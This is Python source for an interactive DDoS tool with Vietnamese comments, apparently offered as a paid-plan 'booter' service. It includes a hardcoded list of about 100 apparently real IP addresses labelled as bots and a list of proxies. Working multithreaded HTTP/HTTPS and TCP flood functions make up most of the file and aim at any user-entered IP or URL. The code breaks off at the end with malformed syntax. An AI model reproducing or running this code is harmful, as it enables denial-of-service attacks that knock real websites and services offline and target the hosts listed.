import socket
import threading
import time
import random
import os
import subprocess
import binascii
import sys
import urllib.parse
import ssl
from concurrent.futures import ThreadPoolExecutor

# ========== PHẦN KHAI BÁO BIẾN (giữ nguyên) ==========
f1ff72b3f04a389ab96d9a508d5c2cfb = {
    "root": "free",
    "6.4": "hard",
    "cry": "hard",
    "x2": "hard",
    "8e683187a00e5d462a4aeee69e9d3d9c": "hard",
    "ot55": "hard",
    "ad243eecb4d5693230c8ff598e4d0018": "hard",
    "58h": "hard",
    "e9060e1816f638c09b686157164d013b": "hard",
    "lc1": "hard",
    "e10adc3949ba59abbe56e057f20f883e": "hard",
    "atz": "hard",
    "0c0151a51649c572af901daed9f2b84e": "hard",
    "hard": "hard",
    "pwr": "hard",
    "zxc": "hard",
    "qwe": "hard",
    "5f4dcc3b5aa765d61d8327deb882cf99": "hard",
    "mnb": "hard",
    "c4ca4238a0b923820dcc509a6f75849b": "hard",
    "7gh": "hard",
    "098f6bcd4621d373cade4e832627b4f6": "hard",
    "ded681fc154529ebbc7562fb0c73ba47": "hard",
    "ddos": "ddos",
}

PLANS = {
    "free": {"methods": ["tcp", "syn", "curl", "tcphex", "http", "synhex", "http-flood"], "maxtime": 120, "maxattacks": 5, "maxconcurrents": 1, "total_bandwidth_mb": 100, "max_rps": 100},
    "ddos": {"methods": ["tcp", "syn", "http", "https", "curl", "nethold", "tcphex", "synhex", "http-flood", "https-flood"], "maxtime": 300, "maxattacks": 50, "maxconcurrents": 50, "total_bandwidth_mb": 1000, "max_rps": 1000},
    "hard": {"methods": ["tcp", "tcphex", "slowloris", "curl", "syn", "home", "hexgen", "https", "synhex", "http-flood", "https-flood"], "maxtime": 500, "maxattacks": 10, "maxconcurrents": 20, "total_bandwidth_mb": 5000, "max_rps": 5000},
}

ALL_METHODS = ["tcp", "udp", "http", "https", "curl", "syn", "slowloris", "nethold", "home", "sslslam", "tlsvip", "fivem", "minecraft", "hexgen", "udphex", "tcphex", "synhex", "http-flood", "https-flood"]

bot_ipv4_list = [
    "24.5.119.233", "99.232.138.45", "184.66.78.145", "68.149.122.180", "70.55.54.221",
    "50.67.91.48", "142.126.145.11", "24.212.171.14", "198.84.221.56", "96.44.189.3",
    "24.141.146.211", "99.233.67.107", "184.69.15.86", "74.210.76.22", "47.216.119.39",
    "38.86.150.50", "71.93.145.220", "174.112.133.29", "142.161.8.124", "24.53.92.47",
    "70.49.156.165", "142.166.103.244", "76.64.34.199", "135.23.120.86", "72.139.2.178",
    "68.144.102.13", "184.66.236.108", "199.175.56.10", "70.30.156.92", "38.104.136.66",
    "71.197.9.122", "104.57.10.105", "24.201.245.91", "47.55.69.131", "64.229.126.62",
    "174.5.146.113", "50.71.33.29", "47.23.182.18", "24.89.105.37", "216.121.69.75",
    "216.165.11.64", "64.183.75.215", "142.222.197.92", "47.147.124.34", "70.26.77.231",
    "142.165.215.120", "65.95.75.123", "72.38.140.28", "198.84.238.130", "38.122.68.201",
    "47.53.106.88", "142.117.190.206", "174.114.88.129", "24.156.159.217", "142.118.25.42",
    "24.138.199.68", "65.94.137.210", "50.68.181.67", "68.151.125.41", "47.52.78.14",
    "50.67.250.90", "99.234.145.33", "174.112.105.13", "24.84.170.21", "47.54.31.114",
    "64.228.36.77", "184.144.27.8", "47.55.116.199", "24.85.117.162", "216.209.122.187",
    "38.88.70.90", "47.148.221.50", "174.7.193.189", "104.223.94.130", "24.66.34.19",
    "142.134.126.85", "74.13.71.220", "198.91.69.33", "47.135.200.191", "64.180.138.116",
    "64.229.64.150", "47.52.64.216", "174.116.40.215", "216.108.234.149", "24.53.62.100",
    "50.70.23.207", "50.71.208.91", "142.165.19.192", "64.229.159.101", "47.23.20.180",
    "174.112.230.101", "104.246.176.42", "65.95.126.38", "184.70.226.161", "38.92.11.29",
    "185.57.56.122", "84.241.216.213", "82.217.111.12", "145.53.81.96", "37.97.190.154"
]

proxy_list = [
    "104.243.32.29:1080", "98.162.25.16:4145", "184.178.172.14:4145",
    "67.201.33.10:25283", "72.195.34.35:4145", "174.77.111.197:4145", "184.181.217.213:4145",
    "184.178.172.25:15291", "184.178.172.14:4145", "184.181.217.206:4145",
    "198.177.254.131:4145", "208.65.90.21:4145", "51.158.125.47:16379",
    "51.250.108.153:1080", "103.245.205.142:35158", "82.223.165.28:4733",
    "212.237.125.216:6969", "91.214.62.121:8053", "45.89.28.226:12915",
    "199.187.210.54:4145", "199.102.104.70:4145", "161.35.70.249:1080",
    "98.152.200.61:8081", "37.18.73.60:5566", "47.243.75.202:58854",
    "103.90.226.245:1080", "94.23.222.122:10581", "103.174.123.134:8199",
    "159.203.61.169:1080", "138.68.60.8:1080", "51.15.139.14:16379",
    "51.15.236.150:16379", "144.22.175.58:1080", "121.169.46.116:1090",
    "194.152.50.92:5678", "102.36.127.53:1080", "45.67.89.123:4141",
    "172.16.254.1:9050", "103.21.244.55:10801", "185.220.101.12:5566",
    "78.153.140.88:3128", "47.243.75.202:58854", "98.152.200.61:8081",
    "104.28.12.34:1080", "203.0.113.45:4145", "37.18.73.60:5566",
    "45.32.123.45:9050", "142.93.45.67:10801", "167.99.234.56:3129",
    "51.15.200.123:1080", "176.58.112.34:4141", "188.166.45.78:9050",
    "45.76.156.89:1080", "104.236.78.90:5566", "172.67.89.123:3128",
    "192.0.2.45:10801", "198.51.100.67:4141", "203.0.113.89:9050",
    "45.67.123.234:1080", "78.157.88.123:4145", "185.93.2.45:5566",
    "103.147.45.67:10801", "47.89.123.45:3128", "138.68.234.56:9050",
    "167.71.89.123:1080", "45.32.167.89:4141", "104.244.42.123:5566",
    "172.105.45.67:10801", "51.158.123.234:3129", "188.166.200.45:9"
]

# ========== PHẦN ATTACK LOGIC VỚI URL VÀ RPS ==========
class AttackManager:
    def __init__(self):
        self.attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0
        }
    
    def get_user_plan(self, username):
        return f1ff72b3f04a389ab96d9a508d5c2cfb.get(username, "free")
    
    def can_launch_attack(self, username, method, duration, rps=0):
        plan = self.get_user_plan(username)
        plan_info = PLANS.get(plan, PLANS["free"])
        
        # Kiểm tra method
        if method not in plan_info["methods"]:
            return False, f"Method '{method}' not allowed for {plan} plan"
        
        # Kiểm tra thời gian
        if duration > plan_info["maxtime"]:
            return False, f"Max duration is {plan_info['maxtime']} seconds"
        
        # Kiểm tra RPS
        if rps > plan_info["max_rps"]:
            return False, f"Max RPS is {plan_info['max_rps']} for {plan} plan"
        
        # Kiểm tra số attack đồng thời
        user_attacks = sum(1 for a in self.attacks.values() if a['user'] == username)
        if user_attacks >= plan_info["maxconcurrents"]:
            return False, f"Max {plan_info['maxconcurrents']} concurrent attacks"
        
        return True, "OK"
    
    def parse_url(self, url):
        """Phân tích URL thành host, port, path"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        parsed = urllib.parse.urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        path = parsed.path or '/'
        if parsed.query:
            path += '?' + parsed.query
        
        return host, port, path, parsed.scheme
    
    def http_flood_worker(self, host, port, path, is_https, rps, duration, attack_id, stats):
        """Worker cho HTTP flood"""
        end_time = time.time() + duration
        request_count = 0
        
        # Headers ngẫu nhiên
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        while time.time() < end_time and attack_id in self.attacks:
            try:
                # Tạo socket
                if is_https:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    ssl_sock = context.wrap_socket(sock, server_hostname=host)
                    ssl_sock.connect((host, port))
                    s = ssl_sock
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((host, port))
                
                # Tạo HTTP request
                headers = [
                    f"GET {path} HTTP/1.1",
                    f"Host: {host}",
                    f"User-Agent: {random.choice(user_agents)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1",
                    f"Cache-Control: max-age={random.randint(0, 3600)}",
                    "\r\n"
                ]
                
                request = "\r\n".join(headers)
                s.send(request.encode())
                
                # Nhận phản hồi (không cần xử lý)
                try:
                    s.recv(1024)
                    stats['successful'] += 1
                except:
                    stats['failed'] += 1
                
                s.close()
                request_count += 1
                stats['total'] += 1
                
            except Exception as e:
                stats['failed'] += 1
                stats['total'] += 1
            
            # Điều chỉnh tốc độ RPS
            if rps > 0:
                time.sleep(1.0 / rps)
        
        return request_count
    
    def http_flood_attack(self, url, rps, duration, attack_id, thread_count=10):
        """HTTP Flood attack với URL và RPS"""
        host, port, path, scheme = self.parse_url(url)
        is_https = (scheme == 'https')
        
        end_time = time.time() + duration
        stats = {
            'total': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time()
        }
        
        print(f"[Attack #{attack_id}] Starting HTTP Flood on {url}")
        print(f"[Attack #{attack_id}] Target: {host}:{port}")
        print(f"[Attack #{attack_id}] RPS: {rps} | Threads: {thread_count}")
        
        # Tạo worker threads
        workers = []
        for i in range(thread_count):
            worker_rps = rps // thread_count
            if i == 0:
                worker_rps += rps % thread_count
            
            worker = threading.Thread(
                target=self.http_flood_worker,
                args=(host, port, path, is_https, worker_rps, duration, attack_id, stats),
                name=f"HTTP-Flood-Worker-{i}"
            )
            worker.daemon = True
            workers.append(worker)
            worker.start()
        
        # Hiển thị stats trong khi chạy
        while time.time() < end_time and attack_id in self.attacks:
            elapsed = time.time() - stats['start_time']
            if elapsed > 0:
                current_rps = stats['total'] / elapsed
                print(f"\r[Attack #{attack_id}] Requests: {stats['total']} | "
                      f"Success: {stats['successful']} | Fail: {stats['failed']} | "
                      f"RPS: {current_rps:.1f}", end='', flush=True)
            time.sleep(1)
        
        # Đợi workers kết thúc
        for worker in workers:
            worker.join(timeout=1)
        
        print(f"\n[Attack #{attack_id}] Completed! Total requests: {stats['total']}")
        
        # Cập nhật global stats
        with self.lock:
            self.stats['total_requests'] += stats['total']
            self.stats['successful_requests'] += stats['successful']
            self.stats['failed_requests'] += stats['failed']
            
            if attack_id in self.attacks:
                del self.attacks[attack_id]
    
    def tcp_attack(self, target, port, duration, attack_id):
        """TCP flood attack (giữ nguyên)"""
        end_time = time.time() + duration
        packet = random._urandom(1024)
        
        while time.time() < end_time and attack_id in self.attacks:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                for _ in range(100):
                    s.send(packet)
                s.close()
            except:
                pass
            time.sleep(0.01)
        
        with self.lock:
            if attack_id in self.attacks:
                del self.attacks[attack_id]
    
    def launch_attack(self, username, method, target, port=80, duration=60, rps=100, url=None):
        """Phát động attack với đầy đủ tham số"""
        
        # Nếu có URL, ưu tiên dùng URL
        if url and method in ['http-flood', 'https-flood']:
            # Kiểm tra RPS
            can_attack, message = self.can_launch_attack(username, method, duration, rps)
            if not can_attack:
                return None, message
            
            # Tạo attack ID
            with self.lock:
                self.attack_counter += 1
                attack_id = self.attack_counter
                
                self.attacks[attack_id] = {
                    'id': attack_id,
                    'user': username,
                    'method': method,
                    'target': url if url else target,
                    'port': port,
                    'duration': duration,
                    'rps': rps,
                    'start_time': time.time(),
                    'thread': None
                }
            
            # Tạo thread cho HTTP flood
            thread = threading.Thread(
                target=self.http_flood_attack,
                args=(url if url else f"http://{target}:{port}", rps, duration, attack_id)
            )
            
        else:
            # Attack thông thường
            can_attack, message = self.can_launch_attack(username, method, duration)
            if not can_attack:
                return None, message
            
            with self.lock:
                self.attack_counter += 1
                attack_id = self.attack_counter
                
                self.attacks[attack_id] = {
                    'id': attack_id,
                    'user': username,
                    'method': method,
                    'target': target,
                    'port': port,
                    'duration': duration,
                    'rps': 0,
                    'start_time': time.time(),
                    'thread': None
                }
            
            if method == "tcp":
                thread = threading.Thread(
                    target=self.tcp_attack,
                    args=(target, port, duration, attack_id)
                )
            else:
                thread = threading.Thread(
                    target=self.tcp_attack,
                    args=(target, port, duration, attack_id)
                )
        
        # Lưu và chạy thread
        self.attacks[attack_id]['thread'] = thread
        thread.daemon = True
        thread.start()
        
        return attack_id, f"Attack #{attack_id} launched successfully!"
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.attacks:
                del self.attacks[attack_id]
                return True, f"Attack #{attack_id} stopped"
        return False, f"Attack #{attack_id} not found"
    
    def list_attacks(self, username=None):
        with self.lock:
            if username:
                return {aid: info for aid, info in self.attacks.items() 
                       if info['user'] == username}
            return self.attacks.copy()
    
    def stop_all_attacks(self, username=None):
        with self.lock:
            if username:
                to_stop = [aid for aid, info in self.attacks.items() 
                          if info['user'] == username]
            else:
                to_stop = list(self.attacks.keys())
            
            for aid in to_stop:
                del self.attacks[aid]
            
            return len(to_stop)
    
    def get_stats(self):
        with self.lock:
            return self.stats.copy()

# ========== PHẦN GIAO DIỆN VỚI URL VÀ RPS ==========
def display_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("=" * 70)
    print("TOOL DDOS BY MINH KHANG - VERSION 2.0 (URL & RPS SUPPORT)")
    print("=" * 70)
    print(f"Users: {len(f1ff72b3f04a389ab96d9a508d5c2cfb)} | Bots: {len(bot_ipv4_list)} | Methods: {len(ALL_METHODS)}")
    print("=" * 70)

def main_menu():
    print("\nMAIN MENU:")
    print("1. Launch Attack (with URL & RPS)")
    print("2. List Active Attacks")
    print("3. Stop Attack")
    print("4. Stop All Attacks")
    print("5. User Information")
    print("6. Methods List")
    print("7. View Statistics")
    print("8. Exit")
    print("-" * 50)
    
    choice = input("Select option: ").strip()
    return choice

def launch_attack_menu(attack_manager):
    print("\n" + "="*50)
    print("LAUNCH ATTACK (SUPPORT URL & RPS)")
    print("="*50)
    
    username = input("Username: ").strip()
    if not username:
        print("Username required!")
        return
    
    # Hiển thị thông tin user
    plan = attack_manager.get_user_plan(username)
    plan_info = PLANS.get(plan, PLANS["free"])
    
    print(f"\nUser: {username} | Plan: {plan}")
    print(f"Max Duration: {plan_info['maxtime']}s | Max RPS: {plan_info['max_rps']}")
    print(f"Allowed methods: {', '.join(plan_info['methods'])}")
    
    # Chọn method
    print("\nAvailable Methods:")
    for i, method in enumerate(plan_info['methods'], 1):
        print(f"  {i}. {method}")
    
    method_choice = input(f"\nSelect method (1-{len(plan_info['methods'])}): ").strip()
    if not method_choice.isdigit() or int(method_choice) < 1 or int(method_choice) > len(plan_info['methods']):
        print("Invalid method selection!")
        return
    
    method = plan_info['methods'][int(method_choice)-1]
    
    # Chọn target type
    print("\nTarget Type:")
    print("1. IP Address (e.g., 192.168.1.1)")
    print("2. URL/Website (e.g., https://example.com)")
    
    target_type = input("Select target type (1 or 2): ").strip()
    
    if target_type == "2":
        # Nhập URL
        url = input("Enter URL (with http:// or https://): ").strip()
        if not url:
            print("URL required!")
            return
        
        # Phân tích URL để lấy host và port mặc định
        try:
            parsed = urllib.parse.urlparse(url)
            target = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        except:
            print("Invalid URL!")
            return
    else:
        # Nhập IP
        target = input("Target IP/host: ").strip()
        if not target:
            print("Target required!")
            return
        
        url = None
        port_input = input("Port [80]: ").strip()
        port = int(port_input) if port_input else 80
    
    # Nhập duration
    duration_input = input(f"Duration in seconds (max {plan_info['maxtime']}) [60]: ").strip()
    duration = int(duration_input) if duration_input else 60
    
    # Nhập RPS (nếu method hỗ trợ)
    rps = 0
    if method in ['http-flood', 'https-flood']:
        rps_input = input(f"Requests Per Second (max {plan_info['max_rps']}) [100]: ").strip()
        rps = int(rps_input) if rps_input else 100
        if rps > plan_info['max_rps']:
            print(f\"RPS too high! Max is {plan_info['max_rps']}\")
            return:
